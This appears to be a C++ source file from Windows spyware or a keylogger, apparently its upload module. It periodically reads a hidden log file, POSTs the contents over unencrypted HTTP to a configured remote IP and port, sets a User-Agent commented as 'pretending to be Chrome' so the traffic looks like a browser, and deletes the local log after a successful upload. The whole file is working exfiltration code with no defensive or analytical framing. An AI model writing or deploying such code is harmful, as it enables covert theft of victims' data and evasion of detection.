#include "push.h"
#include "constants.h"

#define OK 200

DWORD WINAPI PushThread(LPVOID lpParam)
{
    PUSH_PARAMS* params = (PUSH_PARAMS*)lpParam;

    auto ip = params->lpszIpAddress;
    auto port = params->wPort;
    auto period = params->dwPushPeriodMs;

    _RPT1(_CRT_WARN, __FUNCTION__ ": Push IP = %ws\n", ip);
    _RPT1(_CRT_WARN, __FUNCTION__ ": Push Port = %d\n", port);
    _RPT1(_CRT_WARN, __FUNCTION__ ": Push Period = %d\n", period);

    while (true)
    {
        Sleep(period);

        CHAR* buffer = nullptr;
        DWORD dwBytesRead = ReadLog(&buffer);
        if (dwBytesRead == 0 || buffer == nullptr)
            continue;

        DWORD dwStatusCode = Push(ip, port, buffer, dwBytesRead);
        if (buffer != nullptr)
            delete[] buffer;
        if (dwStatusCode != OK)
            continue;
        
        DeleteLog();
    }
}

DWORD ReadLog(CHAR** buffer)
{
    DWORD dwFileSize = 0;
    DWORD dwBytesRead = 0;
    HANDLE hFile = CreateFile(
        OUTPUT_FILE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        _RPT2(_CRT_WARN, __FUNCTION__ ": Failed to open file '%s' (0x%x)\n", OUTPUT_FILE_NAME, GetLastError());
        goto done;
    }

    dwFileSize = GetFileSize(hFile, nullptr);
    *buffer = new CHAR[dwFileSize + 1];
    ZeroMemory(*buffer, dwFileSize + 1);

    _RPT2(_CRT_WARN, __FUNCTION__ ": Open file '%s' for reading (%d bytes). Handle = 0x%x\n", OUTPUT_FILE_NAME, dwFileSize, hFile);
    if (!ReadFile(hFile, *buffer, dwFileSize, &dwBytesRead, nullptr))
    {
        _RPT2(_CRT_ERROR, __FUNCTION__ ": Failed to read file '%s' (0x%x)\n", OUTPUT_FILE_NAME, GetLastError());
        delete[] *buffer;
        return 0;
    }

    if (dwBytesRead == 0)
    {
        _RPT2(_CRT_WARN, __FUNCTION__ ": No bytes read from '%s' (0x%x)\n", OUTPUT_FILE_NAME, GetLastError());
        delete[] *buffer;
        return 0;
    }

    if (dwBytesRead != dwFileSize)
    {
        _RPT4(_CRT_WARN, __FUNCTION__ ": Failed to read entire %s file (File Size: %d, Bytes Read: %d, Last Error: 0x%x)",
            OUTPUT_FILE_NAME, dwFileSize, dwBytesRead, GetLastError());
        delete[] *buffer;
        return 0;
    }

    _RPT1(_CRT_WARN, __FUNCTION__ ": Read %d bytes from '%s'\n", dwBytesRead, OUTPUT_FILE_NAME);

done:
    if (hFile) CloseHandle(hFile);
    return dwBytesRead + 1 /* null terminator */;
}

BOOL DeleteLog()
{
    BOOL bDeleted = DeleteFile(OUTPUT_FILE_NAME);
    if (!bDeleted)
    {
        _RPT2(_CRT_ERROR, __FUNCTION__ ": Failed to delete '%s' (0x%x)\n", OUTPUT_FILE_NAME, GetLastError());
        return FALSE;
    }

    _RPT1(_CRT_WARN, __FUNCTION__ ": Deleted '%s'", OUTPUT_FILE_NAME);
    return TRUE;
}

DWORD Push(LPCWSTR lpszIpAddress, WORD wPort, CHAR* lpLog, DWORD dwLogSize)
{
    _RPT3(_CRT_WARN, __FUNCTION__ " > Sending push request to %ws:%d [%d bytes]\n", lpszIpAddress, wPort, dwLogSize);
    HINTERNET hSession = INVALID_HANDLE_VALUE;
    HINTERNET hConnect = INVALID_HANDLE_VALUE;
    HINTERNET hRequest = INVALID_HANDLE_VALUE;
    DWORD dwStatusCode = -1;
    DWORD dwSize = sizeof(dwStatusCode);
    DWORD dwBytesWritten = 0;

    hSession = WinHttpOpen(
        L"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36", // Pretending to be Chrome
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession)
    {
        _RPT1(_CRT_WARN, __FUNCTION__ ": WinHttpOpen Error %u\n", GetLastError());
        goto done;
    }

    hConnect = WinHttpConnect(hSession, lpszIpAddress, wPort, 0);
    if (!hConnect)
    {
        _RPT1(_CRT_WARN, __FUNCTION__ ": WinHttpConnect Error %u\n", GetLastError());
        goto done;
    }

    hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST", // Verb
        L"log", // Path
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0 // http vs https (WINHTTP_FLAG_SECURE)
    );
    if (!hRequest)
    {
        _RPT1(_CRT_WARN, __FUNCTION__ ": WinHttpOpenRequest Error %u\n", GetLastError());
        goto done;
    }

    if (!WinHttpAddRequestHeaders(hRequest, L"Content-Type: text/plain", -1, WINHTTP_ADDREQ_FLAG_ADD))
    {
        _RPT1(_CRT_WARN, __FUNCTION__ ": WinHttpAddRequestHeaders Error %u\n", GetLastError());
        goto done;
    }

    if (!WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0, // Additional Headers
        (LPVOID)lpLog, // lpOptional
        dwLogSize, // dwOptionalLength
        dwLogSize, // dwTotalLength
        0))
    {
        _RPT1(_CRT_WARN, __FUNCTION__ ": WinHttpSendRequest Error %u\n", GetLastError());
        goto done;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        _RPT1(_CRT_WARN, __FUNCTION__ ": WinHttpReceiveResponse Error %u\n", GetLastError());
        goto done;
    }

    if (!WinHttpQueryHeaders(
        hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &dwStatusCode,
        &dwSize,
        WINHTTP_NO_HEADER_INDEX))
    {
        _RPT1(_CRT_WARN, __FUNCTION__ ": WinHttpQueryHeaders Error %u\n", GetLastError());
        goto done;
    }

done:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    _RPT3(_CRT_WARN, __FUNCTION__ " < StatusCode = %d\n", dwStatusCode);
    return dwStatusCode == -1 ? GetLastError() : dwStatusCode;
}